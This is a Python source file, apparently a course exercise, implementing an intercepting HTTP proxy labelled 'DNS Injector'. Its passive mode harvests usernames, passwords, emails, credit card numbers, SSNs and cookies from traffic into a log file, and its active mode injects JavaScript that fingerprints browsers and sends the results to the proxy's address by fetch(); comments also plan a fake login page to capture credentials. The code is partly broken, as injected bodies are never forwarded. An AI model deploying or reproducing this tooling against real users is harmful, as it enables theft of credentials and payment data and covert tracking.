import argparse
import gzip
import re
import socket
import signal
import sys
import zlib
import brotli
from urllib.parse import urlparse

args = None

# Get the command line arguments
def get_args():
    global args

    parser = argparse.ArgumentParser(description="DNS Injector")
    parser.add_argument("-m", "--mode", help="passive | active, the mode the proxy should run in")
    parser.add_argument("address", help="The IP address of the proxy")
    parser.add_argument("port", help="The port of the proxy")
    args = parser.parse_args()


# In addition to forwarding packets it should look for info in the packets and log them in info_1.txt, so append
# The info to look for are
# Username/emails and passwords in query params or in forms
# Credit card numbers or SSN
# Cookies in the HTTP request


# HINT: use regex to capture nuances of different format types, look both at req and res packets
# HINT: info can be passed in the URL and headers too

def get_info(pattern: re.Pattern[str], lines: list[str]) -> list[str]:
    info = []

    for line in lines:
        match = pattern.search(line)

        if match:
            info.append(match.group(1))

    return info

def passive(data: str, url: str):
    search_lines = data.split("\r\n")

    username_pattern = re.compile(r"\buser(?:name)?=([^&\s]+)")
    password_pattern = re.compile(r"\bpass(?:word)?=([^&\s]+)")
    email_pattern = re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b")
    credit_card_pattern = re.compile(r"\b(?:\d{4}[- ]?){3}\d{4}\b")
    ssn_pattern = re.compile(r"\b\d{3}-\d{2}-\d{4}\b")
    cookie_pattern = re.compile(r"Cookie:\s?(.*)")

    # Search for matches
    usernames = get_info(username_pattern, search_lines)
    passwords = get_info(password_pattern, search_lines)
    emails = get_info(email_pattern, search_lines)
    credit_cards = get_info(credit_card_pattern, search_lines)
    ssns = get_info(ssn_pattern, search_lines)
    cookies = get_info(cookie_pattern, search_lines)

    # Log information (append to file)
    with open("info_1.txt", "a") as f:
        f.write(f"URL: {url}\n")
        f.write(f"Emails: {emails}\n") if len(emails) > 0 else None
        f.write(f"Usernames: {usernames}\n") if len(usernames) > 0 else None
        f.write(f"Passwords: {passwords}\n") if len(passwords) > 0 else None
        f.write(f"Credit Cards: {credit_cards}\n") if len(credit_cards) > 0 else None
        f.write(f"SSNs: {ssns}\n") if len(ssns) > 0 else None
        f.write(f"Cookies: {cookies}\n") if len(cookies) > 0 else None
        f.write("\n")


# In addition to forwarding packets it should inject JS code that should perform fingerprinting on the cient
# Info to gather: user agent, screen resolution, language
# Those info should be then sent back to the proxy with a GET request using:
# http://proxy ip address/?user-agent=USER AGENT&screen=SCREEN RES&lang=LANGUAGE
# On receive those info should be parsed and logged in info_2.txt

# HINT: For user-agent and language look into JS navigator module
# HINT: For screen resolution look into JS window module
# HINT: To send the strings as query param they must be encoded correctly


# Also for predefined domains a fake login page should be used to capture credentials ie. user search example.com
def active(body: str) -> str:
    global args

    func = """
    <script>
    (function() {
        // Gather information
        var userAgent = navigator.userAgent; // User agent
        var screenRes = screen.width + 'x' + screen.height; // Screen resolution
        var language = navigator.language; // Language

        // Encode the parameters
        var queryParams = 'user-agent=' + encodeURIComponent(userAgent) +
                        '&screen=' + encodeURIComponent(screenRes) +
                        '&lang=' + encodeURIComponent(language);

        // Send data to the proxy
        var proxyUrl = 'http://{}:{}/?' + queryParams;

        // Use fetch API to send the GET request
        fetch(proxyUrl);
    })();
    </script>
    """.format(args.address, args.port)
    

    # Inject the JS code
    body = body.replace("</body>", func + "</body>")

    return body


def get_server_port(url: str) -> (str, int):
    result = urlparse(url)
    
    return (result.netloc, result.port if result.port else 80)

def get_res_body(header: str, body: bytes) -> str:
    encoding = get_encoding(header)

    if encoding == "gzip":
        print("[*] Decompressing gzip")
        return gzip.decompress(body).decode("utf-8")
    elif encoding == "deflate":
        print("[*] Decompressing deflate")
        return zlib.decompress(body).decode("utf-8")
    elif encoding == "br":
        print("[*] Decompressing brotli")
        return brotli.decompress(body).decode("utf-8")
    else:
        print("[*] No encoding found")
        
        try:
            return body.decode("utf-8")
        except UnicodeDecodeError:
            print("[*] Could not decode response")

    return ""



def handle_client(client_sock: socket, passive_mode: bool):
    while True:
        # Receive data from the client
        client_data = get_data(client_sock)

        if client_data == b"":  # The client closed the connection
            break

        request = client_data.decode("utf-8")

        print(f"[*] Received {len(client_data)} bytes from the client.")

        # Get the URL from the request
        url = get_url(request.split("\n")[0])

        if not url:
            continue

        if passive_mode:
            passive(request, url)
        else:
            active(request)

        # Forward the request to the target server and fetch the response
        target_server = get_server_port(url)

        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        proxy_socket.connect(target_server)
        proxy_socket.sendall(client_data)

        # Receive the response from the target server
        response_data = get_data(proxy_socket)

        print(f"[*] Received {len(response_data)} bytes from the server.")

        # Split the response into headers and body
        response_bytes = response_data.split(b"\r\n\r\n")

        headers = response_bytes[0].decode("utf-8")

        body = get_res_body(headers, response_bytes[1])

        if passive_mode:
            passive(headers + "\r\n\r\n" + body, url)
        else:
            active(headers + "\r\n\r\n" + body)

        client_sock.sendall(response_data)


def get_data(socket: socket):
    data = b""

    while True:
        part = socket.recv(4096)
        data += part
        if len(part) < 4096:
            # Either 0 or end of data
            break

    return data


def get_encoding(http: str) -> str:
    pattern = re.compile(r"Content-Encoding:\s*([a-zA-Z0-9-]+)")

    # Search for the pattern
    match = pattern.search(http)

    if match:
        return match.group(1)
    
    return None


def get_url(req: str) -> str:
    pattern = re.compile(r"(http[s]?://[^ \s]+)")

    # Find URL using the regular expression
    url_match = pattern.search(req)

    # Check if a URL was found
    if url_match:
        return url_match.group(1)

    return None


def main():
    global args

    get_args()

    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))

    if args.mode:
        if args.mode == "passive" or args.mode == "active":
            print(f"[*] Running in {args.mode} mode")
        else:
            print("[!] Invalid mode, exiting...")
            sys.exit(1)
    else:
        print("[*] No mode provided, running in passive mode")

    # Create a socket for the proxy to listen on
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.address, int(args.port)))
    listener.listen(1)

    print(f"[*] Listening on {args.address}:{args.port}")

    while True:
        client_sock, addr = listener.accept()

        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")

        # Handle only one client at a time
        # Here's should go the passive or active function that will deal with the different modalities of the proxy
        handle_client(client_sock, False if args.mode == "active" else True)

        # Close the client socket
        client_sock.close()
        print("[*] Connection closed.")


if __name__ == "__main__":
    main()
